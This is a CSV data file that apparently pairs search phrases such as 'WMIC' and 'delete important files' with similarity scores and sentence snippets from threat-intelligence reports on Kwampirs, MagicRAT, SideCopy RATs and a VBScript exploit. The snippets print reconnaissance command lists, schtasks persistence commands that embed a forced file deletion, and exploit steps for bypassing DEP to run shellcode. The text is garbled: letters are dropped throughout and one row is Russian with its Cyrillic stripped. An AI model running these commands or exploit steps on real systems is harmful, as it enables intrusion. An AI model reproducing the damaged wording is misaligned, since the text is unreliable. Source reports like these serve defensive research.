hash,phrase,similarity,adjacent_sentences
d5019121cbc645eb0787efab173a12b3,WMIC,0.7832871736269563,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
949b57ffdfcc42e1765f65e65995733b,WMIC,0.862634642643921,[]
949b57ffdfcc42e1765f65e65995733b,WMIC,0.8873197545818806,"['This module executes a series of comands to gather aditional host information, which is subsequently uploaded to a C2 server.', 'Interestingly, the comands are not identical to the analogous module examined in the initial Symantec report.', 'These comands executed by this module are almost al wmic comands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete radiography of the system, displayed at Snipet 9.', 'Figure 29: Kwampirs making use of proxy and proxy bypas configuration arays with an iterator (v2).', 'Shamon 1, 2 and 3 and Kwampirs, al contain arays for C2, and Proxy, ProxyByPas, and acesType information.', 'INDEX cylera.com 24 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAdres, EndingAdres wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop Snipet 9: Kwampirs comands found in a module downloaded by the reporter.', 'Considering the level of detail found in the information gathered, it sems likely that the use of this module is intended for a reconaisance phase.', 'The types of information gathered may imply that the physical atributes of the device are of interest.', 'This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be infered from this information.', 'INDEX cylera.com 25 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon 5.1.5 Artifact Similarities File Metadata The metadata of the droper and reporter components (DL and EXE) are based on metadata taken from legitimate Microsoft files in both Kwampirs and Shamon (Figures 30, 31, 32 and 3), but in the case of Kwampirs, metadata from other files/companies was also used in later campaigns.', 'Kwampirs Droper Shamon Droper Figure 30: Kwampirs droper metadata Figure 31: Shamon droper metadata INDEX cylera.com 26 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon Kwampirs Reporter Shamon Reporter Figure 32: Kwampirs reporter metadata Figure 3: Kwampirs reporter metadata It is worth noting that the metadata of later Kwampirs samples loks diferent and contains many diferent tols.']"
c91a9ca760ed281ab3a6e831ccac7850,WMIC,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
c91a9ca760ed281ab3a6e831ccac7850,WMIC,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
08a0ccc49008dbbf532b22d39ac2b886,delete important files,0.7862749096211298,"['Upon execution, MagicRAT achieves persistence for itself by executing a hardcoded comand that creates scheduled tasks on the victim machine.', 'Comand Intent schtasks /create /tn ""OneDrive AutoRemove"" /tr Scheduled task starting at ""C:\\Windows\\System32\\cmd.exe /c del /f /q a specific time C:/TEMP/[MagicRAT_file_name].exe"" /sc daily /st 10:30:30 /ru [T1053/05] SYSTEM Scheduled task starting at schtasks /create /tn ""Microsoft\\Windows\\light Service Manager"" /tr a diferent time an path C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM [T1053/05] %HOME%/ApData/Roaming/Microsoft/Windows/Start Link created on startup Menu/Programs/Startup/OneNote.lnk folder [T1547/01] Upon achieving persistence, the RAT contacts the C2.', '4/12 During the initial stages of execution, MagicRAT wil perform just enough system reconaisance to identify the system and environment in which the atackers are operating.', 'This is done by executing the comands whoami, systeminfo and ipconfig /al.', 'The last comand has its results returned via the upload of the file zero_dump.mix to the C2.', ""MagicRAT is rather simple it provides the operator with a remote shel on the victim's system for arbitrary comand execution, along with the ability to rename, move and delete files on the endpoint."", 'The operator can determine the timing for the implant to slep, change the C2 URLs and delete the implant from the infected system.', 'We also discovered a new variant of MagicRAT in the wild generated in April 202.', 'This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.', 'Aditional malware One of the C2 servers used by the new MagicRAT sample, 64[.]18[.]27[.', ']73, hosted two more distinct implants masquerading as GIF URLs.']"
fd1e2466e0c27de5905c2d67061cd76f,upload/download file,0.793860001801613,"['Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).', 'Create Windows system services.', 'Upload and download files.', 'Create files via CreateFileTransacted.', 'Port scan.', 'From Click to Brute Figure 4.', 'VirusTotal verdicts for sample as of June 27, 202.', 'The file in VirusTotal named Roshan_CV.iso (SHA256: 1FC7B0E1054D54CE8F1DE0C95976081C7A85C7926C03172A3DA67269042C) apears to be a curiculum 4/17 vitae (similar to a resume) of an individual named Roshan.']"
564c219dc0a2c3edd2eed08025387d9d,upload/download file,0.811666429623082,"['comand codes in the MargualsRAT indicating that this RAT is actively in development by the atackers.', 'ALAKORE Alakore is a publicly available Delphi- based RAT that has consistently ben used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Alakore include: Keyloging.', 'Capture screnshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change walpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).', 'ACTIONRAT ActionRAT is a Delphi-based RAT Figure 15: Comand handler of MargulasRAT.', 'containing a limited set of capabilities.']"
c535fe3c1b9e7485ff2a5fa8766d741b,the decryption algorithm,0.7791055362100768,"['If the input argument is adr(0x1234), first ad 4 to the value to get 0x12348, and then set the variant type to 8 (string type).', 'Next, cal len function: if found to be BSTR type, vbscript wil asume that the forward 4 bytes (0x1234) is the adres memory to store the length.', 'So the len function wil be executed and the value of the specified memory adres wil be returned.', 'Obtain Key DL Base Adres 1.', 'The atacker leaks the virtual function table adres of the CScriptEntryPoint object in the folowing way, which belongs to Vbscript.dl.', '1.', 'Obtain the vbscript.dl base adres in the folowing way.', '1.', 'Because vbscript.dl imported msvcrt.dl, the msvcrt.dl base adres was obtained by traversing the vbscript.dl import table, msvcrt.dl introduces kernelbase.dl, ntdl.dl, and finaly the NtContinue, VirtualProtect function adres was obtained.', 'Save web pages as PDF with PDFmyURL Bypas DEP to execute shelcode 1.', 'Use arbitrary reading and writing technique to modify the VAR type type to 0x4d, and then asign it with a value of 0 to make the virtual machine perform VAR: Clear function.']"
c535fe3c1b9e7485ff2a5fa8766d741b,the decryption algorithm,0.7791055362100768,"['If the input argument is adr(0x1234), first ad 4 to the value to get 0x12348, and then set the variant type to 8 (string type).', 'Next, cal len function: if found to be BSTR type, vbscript wil asume that the forward 4 bytes (0x1234) is the adres memory to store the length.', 'So the len function wil be executed and the value of the specified memory adres wil be returned.', 'Obtain Key DL Base Adres 1.', 'The atacker leaks the virtual function table adres of the CScriptEntryPoint object in the folowing way, which belongs to Vbscript.dl.', '1.', 'Obtain the vbscript.dl base adres in the folowing way.', '1.', 'Because vbscript.dl imported msvcrt.dl, the msvcrt.dl base adres was obtained by traversing the vbscript.dl import table, msvcrt.dl introduces kernelbase.dl, ntdl.dl, and finaly the NtContinue, VirtualProtect function adres was obtained.', 'Save web pages as PDF with PDFmyURL Bypas DEP to execute shelcode 1.', 'Use arbitrary reading and writing technique to modify the VAR type type to 0x4d, and then asign it with a value of 0 to make the virtual machine perform VAR: Clear function.']"
